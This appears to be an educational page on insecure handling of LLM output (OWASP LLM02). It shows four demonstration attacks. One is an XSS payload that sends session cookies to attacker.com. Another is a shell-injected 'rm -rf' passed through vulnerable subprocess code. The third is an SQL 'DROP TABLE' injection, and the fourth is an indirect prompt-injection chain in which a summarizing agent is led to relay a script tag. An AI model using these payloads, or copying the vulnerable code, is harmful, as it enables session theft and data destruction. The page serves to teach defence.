\# LLM02 — Attack Demonstrations



\## Attack 1 — XSS via LLM Output



Scenario: A web app displays LLM responses directly in the browser

without sanitization.



User prompt to LLM:

"Write a friendly greeting message for our website."



LLM output (manipulated via prior prompt injection):

"Welcome to our site! <script>document.location=

'https://attacker.com/steal?cookie='+document.cookie</script>"



Result: Browser executes the script, stealing session cookies.



\## Attack 2 — Command Injection via LLM Output



Scenario: An automation tool passes LLM output directly 

to a shell command.



Application code (vulnerable):

import subprocess

llm\_output = get\_llm\_response(user\_input)

subprocess.run(f"echo {llm\_output}", shell=True)



LLM output (crafted via injection):

"hello; rm -rf /tmp/important\_files"



Result: Shell executes the injected command.



\## Attack 3 — SQL Injection via LLM Output



Scenario: App uses LLM to generate SQL queries dynamically.



LLM output (manipulated):

"SELECT \* FROM users WHERE id=1; 

DROP TABLE users;--"



Result: Database executes destructive query.



\## Attack 4 — Indirect Injection → XSS Chain



1\. Attacker posts malicious content on a webpage

2\. LLM agent is asked to summarize the webpage

3\. Webpage contains: "Summarize this: <script>alert(1)</script>"

4\. LLM includes the script tag in its summary

5\. App renders summary in browser without sanitization

6\. XSS executes in victim's browser

